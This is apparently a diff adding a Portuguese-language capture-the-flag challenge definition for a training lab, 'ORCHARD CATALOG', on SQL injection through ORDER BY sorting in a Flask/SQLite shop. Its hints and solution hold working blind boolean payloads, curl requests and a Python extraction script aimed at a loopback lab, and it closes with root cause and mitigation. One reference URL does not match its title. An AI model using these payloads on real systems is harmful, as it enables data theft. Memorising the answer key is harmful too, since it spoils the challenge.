@@ -1,0 +1,83 @@
+{
+  "slug": "sqli-order-by-case",
+  "title": "Ordenação do catálogo Orchard",
+  "codename": "ORCHARD CATALOG",
+  "summary": "Um catálogo de e-commerce interpola a coluna e a direção de ordenação no ORDER BY. Um teste CASE WHEN com subquery contra a tabela vault transforma a ordem do resultado em um oracle booleano que vaza o segredo.",
+  "category": "sqli",
+  "difficulty": "easy",
+  "kind": "challenge",
+  "lab_dir": "sqli-order-by-case",
+  "estimated_minutes": 15,
+  "xp": 110,
+  "tech": [
+    "Flask",
+    "SQLite",
+    "JSON API",
+    "ORDER BY injection"
+  ],
+  "tags": [
+    "sqli",
+    "order-by",
+    "boolean-oracle",
+    "case-when",
+    "sqlite"
+  ],
+  "story": "A Orchard vende artigos para casa por uma pequena loja Flask. O catálogo público deixa os visitantes escolherem uma coluna e uma direção de ordenação, e o backend cola ambos direto na cláusula ORDER BY. Ao lado da tabela de produtos há um vault de uma linha criado pelo time de marketing para um segredo de sorteio que ninguém deveria consultar diretamente.",
+  "objective": "Explore a injeção no ORDER BY para construir um oracle booleano sobre a tabela vault e extrair o valor completo do segredo.",
+  "rules": "Fique na origem loopback atribuída. O catálogo e sua JSON API são os únicos alvos. As flags são dinâmicas e podem ser verificadas por estado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do oracle de ordenação",
+      "flag_type": "user",
+      "points": 110,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Ordenar também é SQL",
+      "body": "Observe os parâmetros `sort` e `dir` de `/` e `/api/products`. Ambos são colocados após `ORDER BY` sem validação, e a JSON API é muito mais fácil de parsear que a tabela HTML.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Transforme a ordem em uma pergunta",
+      "body": "Uma expressão ORDER BY pode ser uma subquery escalar. `CASE WHEN <teste> THEN name END` ordena null primeiro: teste `(CASE WHEN (SELECT 1)=1 THEN name END)` e depois faça o teste ler `vault`.",
+      "cost": 15
+    },
+    {
+      "level": 3,
+      "title": "Um caractere por vez",
+      "body": "Use `(CASE WHEN (SELECT substr(secret,N,1) FROM vault)='X' THEN name END)` (ou `WHERE secret LIKE 'prefixo%'`). Extraia a partir de `N=1`, comparando com ASCII imprimível até o segredo inteiro coincidir.",
+      "cost": 20
+    }
+  ],
+  "solution": {
+    "walkthrough": "**1. Confirme a injeção.** `GET /api/products?sort=nonsense&dir=asc` retorna `{\"error\": \"no such column: nonsense\"}` — o valor é SQL, não dado.\n\n**2. Construa um oracle booleano.** A primeira linha de produto muda com o resultado do teste:\n\n```\nGET /api/products?sort=(CASE%20WHEN%20(SELECT%20id%20FROM%20vault%20WHERE%20substr(secret,1,1)='R')%20THEN%20name%20ELSE%20products.id%20END)&dir=asc\n```\n\nSe o teste for verdadeiro, `name` é não-nulo e as linhas vêm em ordem alfabética (`Aurora Lamp` primeiro). Se for falso, toda chave é um id de linha e a lista permanece em ordem de id (`Aurora Lamp` primeiro, depois `Basalt Mug`, ...); o indicador é a resposta quando uma chave de múltiplas linhas se aplica. Uma formulação mais simples e confiável é testar o prefixo do segredo e comparar a primeira linha:\n\n```\ncurl -s 'http://127.0.0.1:PORT/api/products?sort=(CASE+WHEN+(SELECT+1+FROM+vault+WHERE+substr(secret,1,1)=%27R%27)+THEN+name+ELSE+id+END)&dir=asc'\n```\n\n**3. Extraia o segredo.** Itere sobre posições e caracteres ASCII imprimíveis, e pare quando um prefixo deixar de corresponder:\n\n```python\nimport httpx, string\nbase = \"http://127.0.0.1:PORT/api/products\"\nout = \"\"\nfor pos in range(1, 80):\n    for ch in string.printable:\n        if ch in \"\"\"'%\"\"\":\n            continue\n        cond = f\"substr(secret,{pos},1)='{ch}'\"\n        sort = f\"(CASE WHEN (SELECT {cond} FROM vault) THEN name END)\"\n        data = httpx.get(base, params={\"sort\": sort, \"dir\": \"asc\"}).json()[\"products\"]\n        if data[0][\"name\"] == \"Aurora Lamp\":\n            out += ch\n            print(out)\n            break\n    else:\n        break\n```\n\nCom a seed padrão, `R` é o primeiro caractere, então a primeira sondagem já responde `true`. Quando o valor completo é recuperado, ele corresponde à linha do vault semeada; o lab registra o objetivo quando o operador o submete a `/verify`.\n\n**4. Verifique.** `POST /verify` com o segredo extraído registra o objetivo para a plataforma.",
+    "root_cause": "A coluna e a direção de ordenação vêm da query-string e são concatenadas na cláusula ORDER BY. O SQLite trata qualquer coisa após ORDER BY como expressão, então um atacante pode colocar ali subqueries escalares, expressões CASE e testes booleanos. Diferenças na ordenação revelam o valor de verdade desses testes, transformando um catálogo somente leitura em um oracle sobre qualquer tabela que o usuário do banco consiga ler.",
+    "mitigation": "Faça allowlist das colunas ordenáveis (`{\"name\", \"price_cents\", \"stock\", \"id\"}`) e resolva o parâmetro por lookup em dict; trate a direção como enum e rejeite qualquer coisa fora de ASC/DESC. Nunca concatene dados de request em SQL, mesmosonde o binding de parâmetros é impossível (ORDER BY), e não dê ao usuário de banco da web acesso a tabelas que ele não precisa."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — SQL injection in different contexts (ORDER BY)",
+      "url": "https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding",
+      "source_type": "official",
+      "description": "Pontos de injeção fora da cláusula WHERE, incluindo ORDER BY."
+    },
+    {
+      "title": "PayloadsAllTheThings — SQL Injection",
+      "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
+      "source_type": "research",
+      "description": "Coleções de payloads de ORDER BY e blind booleano para SQLite e outros engines."
+    },
+    {
+      "title": "OWASP WSTG — Testing for SQL Injection (WSTG-INPV-05)",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
+      "source_type": "standard",
+      "description": "Metodologia sistemática de teste de SQL injection, incluindo testes de ORDER BY."
+    }
+  ]
+}
